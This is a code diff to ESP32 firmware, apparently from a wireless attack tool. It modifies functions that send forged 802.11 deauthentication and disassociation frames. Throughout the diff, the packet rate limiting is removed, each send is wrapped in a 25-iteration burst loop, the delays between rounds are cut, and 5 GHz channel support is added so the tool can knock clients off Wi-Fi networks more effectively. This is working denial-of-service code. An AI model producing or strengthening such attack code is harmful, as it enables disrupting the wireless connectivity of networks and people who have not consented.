@@ -126,9 +126,16 @@ static void deauth_station_task(void *param);
 static void auto_deauth_task(void *Parameter);
 
 esp_err_t deauth_attack_broadcast(uint8_t bssid[6], int channel, uint8_t mac[6]) {
-    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    // Use HT40 for 5GHz channels on dual-band chips
+    wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
+#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
+    if (channel > 14) {
+        second = WIFI_SECOND_CHAN_ABOVE;
+    }
+#endif
+    esp_err_t err = esp_wifi_set_channel(channel, second);
     if (err != ESP_OK) {
-        printf("Failed to set channel: %s\n", esp_err_to_name(err));
+        printf("Failed to set channel %d: %s\n", channel, esp_err_to_name(err));
     }
 
     // Create packets from templates
@@ -164,23 +171,16 @@ esp_err_t deauth_attack_broadcast(uint8_t bssid[6], int channel, uint8_t mac[6])
     disassoc_frame[22] = seq & 0xFF;
     disassoc_frame[23] = (seq >> 8) & 0xFF;
 
-    // Send frames with rate limiting
-    if (check_packet_rate()) {
-        esp_err_t tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
-        if(tx_err == ESP_OK) deauth_packets_sent++;
-        if (check_packet_rate()) {
-            tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
-            if(tx_err == ESP_OK) deauth_packets_sent++;
-        }
-        if (check_packet_rate()) {
-            tx_err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
-            if(tx_err == ESP_OK) deauth_packets_sent++;
-        }
-        if (check_packet_rate()) {
-            tx_err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
-            if(tx_err == ESP_OK) deauth_packets_sent++;
-        }
-    }
+    // Send frames (no rate limiting for burst effectiveness)
+    esp_err_t tx_err;
+    tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+    if (tx_err == ESP_OK) deauth_packets_sent++;
+    tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+    if (tx_err == ESP_OK) deauth_packets_sent++;
+    tx_err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+    if (tx_err == ESP_OK) deauth_packets_sent++;
+    tx_err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+    if (tx_err == ESP_OK) deauth_packets_sent++;
 
     // If not broadcast, send reverse direction
     if (!is_broadcast) {
@@ -200,23 +200,15 @@ esp_err_t deauth_attack_broadcast(uint8_t bssid[6], int channel, uint8_t mac[6])
         disassoc_frame[22] = seq & 0xFF;
         disassoc_frame[23] = (seq >> 8) & 0xFF;
 
-        // Send reverse frames with rate limiting
-        if (check_packet_rate()) {
-            esp_err_t tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
-            if(tx_err == ESP_OK) deauth_packets_sent++;
-        }
-        if (check_packet_rate()) {
-            esp_err_t tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
-            if(tx_err == ESP_OK) deauth_packets_sent++;
-        }
-        if (check_packet_rate()) {
-            esp_err_t tx_err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
-            if(tx_err == ESP_OK) deauth_packets_sent++;
-        }
-        if (check_packet_rate()) {
-            esp_err_t tx_err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
-            if(tx_err == ESP_OK) deauth_packets_sent++;
-        }
+        // Send reverse frames
+        tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+        if (tx_err == ESP_OK) deauth_packets_sent++;
+        tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+        if (tx_err == ESP_OK) deauth_packets_sent++;
+        tx_err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+        if (tx_err == ESP_OK) deauth_packets_sent++;
+        tx_err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+        if (tx_err == ESP_OK) deauth_packets_sent++;
     }
 
     return ESP_OK;
@@ -249,32 +241,49 @@ static void deauth_task(void *param) {
                     for (int i = 0; i < ap_count; i++) {
                         if (memcmp(ap_info[i].bssid, selected_aps_local[sel_idx].bssid, 6) == 0 && ap_info[i].primary == ch) {
                             if (!channel_set) {
-                                esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+                                wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
+#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
+                                if (ch > 14) sec = WIFI_SECOND_CHAN_ABOVE;
+#endif
+                                esp_wifi_set_channel(ch, sec);
                                 channel_set = true;
                             }
-                            deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
+                            // Burst loop for effectiveness
+                            for (int burst = 0; burst < 25; burst++) {
+                                deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
+                            }
                             for (int j = 0; j < station_count; j++) {
                                 if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
-                                    deauth_attack_broadcast(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
+                                    for (int burst = 0; burst < 25; burst++) {
+                                        deauth_attack_broadcast(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
+                                    }
                                 }
                             }
                         }
                     }
                 }
-                if (channel_set) vTaskDelay(pdMS_TO_TICKS(10));
+                if (channel_set) vTaskDelay(pdMS_TO_TICKS(5));
             }
         } else if (strlen((const char *)selected_ap_local.ssid) > 0) {
             for (int i = 0; i < ap_count; i++) {
                 if (strcmp((char *)ap_info[i].ssid, (char *)selected_ap_local.ssid) == 0) {
                     int ch = ap_info[i].primary;
-                    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
-                    deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
+                    wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
+#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
+                    if (ch > 14) sec = WIFI_SECOND_CHAN_ABOVE;
+#endif
+                    esp_wifi_set_channel(ch, sec);
+                    for (int burst = 0; burst < 25; burst++) {
+                        deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
+                    }
                     for (int j = 0; j < station_count; j++) {
                         if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
-                            deauth_attack_broadcast(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
+                            for (int burst = 0; burst < 25; burst++) {
+                                deauth_attack_broadcast(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
+                            }
                         }
                     }
-                    vTaskDelay(pdMS_TO_TICKS(20));
+                    vTaskDelay(pdMS_TO_TICKS(10));
                 }
             }
         } else {
@@ -284,21 +293,29 @@ static void deauth_task(void *param) {
                 for (int i = 0; i < ap_count; i++) {
                     if (ap_info[i].primary == ch) {
                         if (!channel_set) {
-                            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+                            wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
+#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
+                            if (ch > 14) sec = WIFI_SECOND_CHAN_ABOVE;
+#endif
+                            esp_wifi_set_channel(ch, sec);
                             channel_set = true;
                         }
-                        deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
+                        for (int burst = 0; burst < 25; burst++) {
+                            deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
+                        }
                         for (int j = 0; j < station_count; j++) {
                             if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
-                                deauth_attack_broadcast(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
+                                for (int burst = 0; burst < 25; burst++) {
+                                    deauth_attack_broadcast(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
+                                }
                             }
                         }
                     }
                 }
-                if (channel_set) vTaskDelay(pdMS_TO_TICKS(10));
+                if (channel_set) vTaskDelay(pdMS_TO_TICKS(5));
             }
         }
-        vTaskDelay(pdMS_TO_TICKS(50));
+        vTaskDelay(pdMS_TO_TICKS(10));
         uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
         if (now - last_log >= 5000) {
             glog("%" PRIu32 " packets/sec\n", deauth_packets_sent/5);
@@ -423,11 +440,17 @@ static void deauth_station_task(void *param) {
     if (deauth_channel < 1 || deauth_channel > MAX_WIFI_CHANNEL) {
         deauth_channel = 1; // fallback channel
     }
-    (void)esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
+    wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
+#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
+    if (deauth_channel > 14) sec = WIFI_SECOND_CHAN_ABOVE;
+#endif
+    (void)esp_wifi_set_channel(deauth_channel, sec);
     uint32_t last_log = xTaskGetTickCount() * portTICK_PERIOD_MS;
     for (;;) {
-        deauth_attack_broadcast(selected_station_local.ap_bssid, deauth_channel, selected_station_local.station_mac);
-        vTaskDelay(pdMS_TO_TICKS(50));
+        for (int burst = 0; burst < 25; burst++) {
+            deauth_attack_broadcast(selected_station_local.ap_bssid, deauth_channel, selected_station_local.station_mac);
+        }
+        vTaskDelay(pdMS_TO_TICKS(20));
         uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
         if (now - last_log >= 5000) {
             glog("%" PRIu32 " packets/sec\n", deauth_packets_sent / 5);
